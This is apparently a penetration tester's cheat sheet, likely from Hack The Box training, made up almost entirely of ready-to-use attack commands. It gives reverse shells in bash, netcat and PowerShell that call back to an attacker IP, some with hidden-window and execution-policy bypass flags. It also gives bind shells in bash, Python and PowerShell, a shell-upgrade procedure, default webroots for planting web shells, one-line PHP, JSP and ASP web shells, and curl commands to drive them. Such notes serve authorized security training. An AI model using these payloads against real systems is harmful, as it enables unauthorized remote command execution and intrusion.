- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) A comprehensive list of reverse and bind shell commands

## Reverse Shell Commands

### Bash 

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

### PowerShell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Bind Shell

We use a bind shell to connect to the targets listening port, the opposite of a reverse shell, in which, a target connects to our listening port.

### Bash

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

### Python

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

### PowerShell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```


## Upgrading TTY

This is done so we can operate as we would in a normal shell, having access to all commands.

### Python
```shell-session
datboyblu3@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
```

After running the above command enter 'ctrl+z' to background the shell and go back to your local terminal and input the following:

```
stty raw -echo
fg

[Enter]
[Enter]
```

- fg brings back our netcat shell to the foreground. Hit enter to get back our shell.
- use *stty size* to output the rows and columns
- To set and configure a realistic terminal...
```
export TERM=xterm-256color
stty rows row_number columns column_number
```

## Web Shell

A web shell is a web srcipt a la PHP or ASPX, that accepts commands through HTTP request parameters such as GET or POST request parameters, executes our commands and prints output to the web page.

### Uploading a Web Shell

- The web shell needs to be placed into the remote hosts web directory to execute the script via the browser
- This is typically done via a vulnerable upload feature

Here the default webroots for common web servers

| Web Sever   | Default Webroot |
| ----------- | ----------- |
| Apache      | /var/www/html/       |
| Nginx       | /var/local/nginx/html |
| IIS         | c:\inetpub\wwwroot\ |
| XAMPP       | C:\xampp\htdocs |

### Web Shell Examples

**php**

```php
<?php system($_REQUEST["cmd"]); ?>
```

**jsp**
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**asp**
```asp
<% eval request("cmd") %>
```

### Accessing the Web Shell

**via curl**
``` bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

**via the browser**
```bash
http://SERVER_IP:PORT/shell.php?cmd=id
```